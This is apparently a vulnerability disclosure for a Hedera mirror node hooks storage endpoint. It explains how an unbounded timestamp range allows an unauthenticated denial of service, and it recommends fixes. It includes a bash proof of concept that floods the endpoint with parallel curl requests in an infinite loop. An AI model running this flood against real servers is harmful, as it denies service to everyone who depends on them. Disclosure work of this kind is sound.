### Title
Unbounded Timestamp Range in Historical Hook Storage Query Enables Unauthenticated DoS

### Summary
An unprivileged external user can submit a `GET /api/v1/accounts/{ownerId}/hooks/{hookId}/storage` request with a one-sided timestamp lower bound (e.g., `timestamp=gte:1`) and up to 100 `key=eq:` parameters, all within the default key range. This causes `getHookStorageChange()` to invoke `findByKeyInAndTimestampBetween()` with `timestampUpperBound = Long.MAX_VALUE`, generating a maximally expensive `DISTINCT ON (key)` SQL scan across the entire `hook_storage_change` table. No authentication or rate limiting exists on this endpoint in the `rest-java` module.

With `timestampLowerBound=1` and `timestampUpperBound=9223372036854775807`, the database must scan every row in `hook_storage_change` matching the `key IN (...)` clause across all of history, then apply `DISTINCT ON (key)` — a full historical table scan.

**Secondary bug**: At line 104, `keys` (the raw unfiltered collection) is passed to the repository instead of `keysInRange`. This means keys outside the `keyLowerBound/keyUpperBound` range are also forwarded to the DB, but in the described attack all keys are within range so this is moot for this vector.

**Failed assumption**: The code assumes users will always supply a bounded timestamp range. There is no enforcement that both a lower and upper timestamp bound must be provided for historical queries.

### Impact Explanation

Each crafted request causes a `DISTINCT ON (key) ... WHERE key IN (100 keys) AND consensus_timestamp BETWEEN 1 AND 9223372036854775807` query against the `hook_storage_change` table. As the table grows with network activity, this query becomes progressively more expensive. An attacker sending these requests in a tight loop can saturate database CPU and I/O, degrading or denying service to all mirror node REST API consumers. The impact is confined to the mirror node infrastructure (not the Hedera consensus network), consistent with the Medium/griefing classification.

### Likelihood Explanation

The endpoint is publicly accessible with no authentication required and no rate limiting in the `rest-java` module (the `ThrottleManagerImpl` exists only in the `web3` module). The attack requires only a standard HTTP client. The parameters needed (`timestamp=gte:1` plus up to 100 `key=eq:` values) are trivially constructable. The attack is fully repeatable and automatable, making sustained DoS straightforward. [7](#0-6) 

### Recommendation

1. **Require both bounds for historical queries**: Validate in `HookStorageRequest` or the controller that when `isHistorical()` is true, both a lower and upper timestamp bound must be present, and enforce a maximum span (e.g., no more than a configurable window such as 1 hour in nanoseconds).
2. **Fix `keys` vs `keysInRange`**: In `getHookStorageChange()`, pass `keysInRange` (not `keys`) to `findByKeyInAndTimestampBetween()`.
3. **Add rate limiting**: Apply a per-IP or global rate limiter to the `rest-java` hooks storage endpoint, consistent with the throttling already present in the `web3` module.

### Proof of Concept

```bash
# Step 1: Identify any valid ownerId and hookId from the mirror node
OWNER="0.0.123"
HOOK_ID="1"
BASE="https://<mirror-node-host>/api/v1/accounts/${OWNER}/hooks/${HOOK_ID}/storage"

# Step 2: Build a request with one-sided timestamp and 100 in-range keys
KEYS=""
for i in $(seq 1 100); do
  HEX=$(printf '%064x' $i)
  KEYS="${KEYS}&key=eq:0x${HEX}"
done

# Step 3: Fire in a loop — no credentials needed
while true; do
  curl -s "${BASE}?timestamp=gte:1${KEYS}" -o /dev/null &
done
```

Each iteration triggers:
```sql
SELECT DISTINCT ON (key) ...
FROM hook_storage_change
WHERE owner_id = 123
  AND hook_id = 1
  AND key IN (<100 keys>)
  AND consensus_timestamp BETWEEN 1 AND 9223372036854775807
```

Sustained parallel requests exhaust database resources, causing mirror node API degradation or outage.

    public long adjustUpperBound() {
        if (this.upper == null) {
            return Long.MAX_VALUE;
        }

        long upperBound = this.upper.value();
        if (this.upper.operator() == RangeOperator.LT) {
            upperBound--;
        }

        return upperBound;
    }
